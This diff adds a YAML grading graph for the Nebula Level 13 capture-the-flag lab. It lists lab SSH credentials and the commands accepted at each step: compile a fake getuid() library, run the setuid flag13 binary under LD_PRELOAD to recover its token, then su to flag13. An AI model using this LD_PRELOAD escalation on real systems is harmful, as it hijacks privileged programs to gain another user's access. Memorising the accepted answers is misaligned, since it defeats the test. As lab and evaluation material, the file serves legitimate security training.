@@ -1,0 +1,94 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: nebula_level13
+  name: Nebula Level 13
+  description: Override getuid() with LD_PRELOAD to recover the flag13 token and switch users.
+attacker_context:
+  user: level13
+  access:
+    method: ssh
+    credentials:
+      username: level13
+      password: level13
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node3
+irrelevant_commands:
+- man
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- ls
+- cd
+- cat
+- file
+- strings
+- ltrace
+- strace
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: UID check identified
+- id: node1
+  type: state
+  label: Preload library prepared
+- id: node2
+  type: state
+  label: flag13 token recovered
+- id: node3
+  type: state
+  label: Execution as flag13 obtained
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: inspect_flag13_binary_behavior
+  accepted_commands:
+  - cat /home/flag13/flag13.c
+  - strings /home/flag13/flag13 | grep token
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge1
+  from: node0
+  to: node1
+  action: compile_fake_getuid_shared_library
+  accepted_commands:
+  - gcc -fPIC -shared -o /tmp/fakeuid.so /tmp/fakeuid.c
+  - cc -fPIC -shared -o /tmp/fakeuid.so /tmp/fakeuid.c
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: execute_flag13_with_ld_preload
+  accepted_commands:
+  - LD_PRELOAD=/tmp/fakeuid.so /home/flag13/flag13
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge3
+  from: node2
+  to: node3
+  action: switch_to_flag13_with_recovered_token
+  accepted_commands:
+  - su - flag13
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
